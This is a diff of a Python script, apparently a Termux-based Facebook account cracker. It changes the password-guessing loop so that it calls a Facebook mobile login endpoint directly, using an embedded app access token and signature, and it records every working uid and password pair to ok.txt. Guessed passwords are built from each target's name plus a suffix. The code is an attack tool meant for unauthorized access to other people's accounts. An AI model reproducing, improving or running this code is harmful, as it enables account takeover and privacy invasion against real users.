@@ -28,7 +28,7 @@ if not os.path.isfile("/data/data/com.termux/files/usr/bin/ruby"):
     os.system("apt install ruby -y && gem install lolcat")
 from requests.exceptions import ConnectionError
 os.system("git pull")
-if not os.path.isfile("/data/data/com.termux/files/home/infect/...../index.js"):
+if not os.path.isfile("/data/data/com.termux/files/home/sani/...../node_modules/express/lib/application.js"):
     os.system("cd ..... && npm install")
     os.system("fuser -k 5000/tcp &")
     os.system("#")
@@ -353,9 +353,9 @@ def a_menu_select():
 		uid,name=user.split("|")
 		try:
 		    pass1 = name.lower() + p1
-                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
+                    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
                     q = json.loads(data)
-                    if "loc" in q:
+                    if "access_token" in q:
                         print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass1+" | "+name)
                         ok=open("ok.txt","a")
                         ok.write(uid+" | "+pass1+"\n")
